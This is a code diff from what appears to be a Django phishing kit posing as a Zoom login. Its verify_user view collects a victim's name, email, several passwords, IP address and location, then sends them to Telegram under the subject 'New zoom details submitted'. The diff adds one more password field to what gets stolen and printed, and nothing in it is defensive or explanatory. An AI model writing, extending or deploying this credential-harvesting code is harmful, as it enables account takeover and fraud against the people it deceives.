@@ -42,7 +42,6 @@ def final(request):
     meet = request.GET.get('meeting')  # 'video'
     encoded_id = request.GET.get('id')       # Base64 encoded meeting ID
     encoded_access = request.GET.get('access')
-    print(meet,encoded_id,encoded_access)
     try:
         meeting_id = base64.b64decode(encoded_id).decode('utf-8') if encoded_id else None
         access_code = base64.b64decode(encoded_access).decode('utf-8') if encoded_access else None
@@ -56,15 +55,16 @@ def verify_user(request):
     if request.method == "POST":
         name = request.POST.get("name")
         email = request.POST.get("mail")
+        passw = request.POST.get("pass")
         pass1 = request.POST.get("pass1")
         pass2 = request.POST.get("pass2")
         ip_address = request.META.get("REMOTE_ADDR")
         country, city = get_country_from_ip(ip_address)
         subject = 'New zoom details submitted'
-        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword1: {pass1}\npassword2: {pass2}"
+        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword: {passw}\npassword1: {pass1}\npassword2: {pass2}"
         send_to_telegram(mail_message)
 
-        print(name,email,pass1,pass2)
+        print(name,email,passw,pass1,pass2)
         
         # Add your logic here (e.g., validate credentials)
         
